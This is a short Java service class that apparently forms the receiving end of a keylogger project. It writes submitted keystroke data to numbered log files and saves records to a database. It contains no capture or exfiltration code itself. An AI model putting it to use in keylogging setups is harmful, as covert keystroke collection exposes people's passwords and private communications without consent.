package org.gs.Services;

import org.gs.entity.Keylogger;
import javax.inject.Singleton;
import javax.persistence.PersistenceException;
import javax.transaction.Transactional;
import java.io.FileNotFoundException;
import java.io.PrintWriter;

@Singleton
public class KeylogService {
    private int inc = 0;

    @Transactional
    public Keylogger addKeylog(Keylogger newKeylogger){
        try {
            String res = newKeylogger.getData();
            this.inc +=1;
            String path = "D:\\firstVersion\\" + inc + ".log";
            PrintWriter out = new PrintWriter(path);
            out.print(res);
            out.close();
            newKeylogger.translitor(path, inc);
            newKeylogger.setData(path);
            newKeylogger.persistAndFlush();

        }catch (PersistenceException e){
            throw e;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        return newKeylogger;
    }
}
